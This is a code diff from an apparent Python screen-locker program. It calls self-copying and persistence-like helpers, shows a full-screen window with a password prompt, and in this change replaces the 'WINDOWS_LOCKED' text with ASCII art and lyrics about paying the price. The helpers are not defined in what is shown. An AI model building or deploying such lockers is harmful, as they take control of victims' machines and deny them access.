@@ -63,14 +63,25 @@ class Locker():
         to_the_moon("C:\\myFiles\\locker.py")
         neverfadeaway()
         f_screen()
-        txt_one = Label(self.win, text='WINDOWS_LOCKED', font=("Arial Bold", fontsize_H), fg='red', bg='black')
-        txt_three = Label(self.win, text='WINDOWS_LOCKED', font=("Arial Bold", font_size), fg='white', bg='black')
+        txt_one = Label(self.win, text='''
+                                                                                                                          
+    /|    / /                                   //   / /                          // | |                                  
+   //|   / /  ___              ___      __     //___   ___      ___   /  ___     //__| |                  ___             
+  // |  / / //___) ) ||  / / //___) ) //  ) ) / ___  //   ) ) //   ) / //___) ) / ___  |   //  / /  / / //   ) ) //   / / 
+ //  | / / //        || / / //       //      //     //   / / //   / / //       //    | |  //  / /  / / //   / / ((___/ /  
+//   |/ / ((____     ||/ / ((____   //      //     ((___( ( ((___/ / ((____   //     | | ((__( (__/ / ((___( (      / /   
+
+''', font=("Courier", 12), fg='red', bg='black')
+        txt_three = Label(self.win, text='''We lost everything.
+         We have to pay the price.
+         Yea,we lost everything.
+             We have to pay the price.''', font=("Courier", font_size), fg='white', bg='black')
         txt_one.grid(column=0,row=0),txt_three.grid(column=0,row=0)
-        txt_one.place(relx = .01, rely = .01),txt_three.place(relx = .01, rely = .21)
+        txt_one.place(relx = .12, rely = .04),txt_three.place(relx = .01, rely = .41)
         txt = Entry(self.win)
         btn = Button(self.win, text="passw", command=clicked)  
-        txt.place(relx = .28, rely = .5, relwidth=.3, relheight=.06)
-        btn.place(relx = .62, rely = .5, relwidth=.1, relheight=.06)
+        txt.place(relx = .28, rely = .6, relwidth=.3, relheight=.06)
+        btn.place(relx = .62, rely = .6, relwidth=.1, relheight=.06)
         self.win.mainloop()
 
 
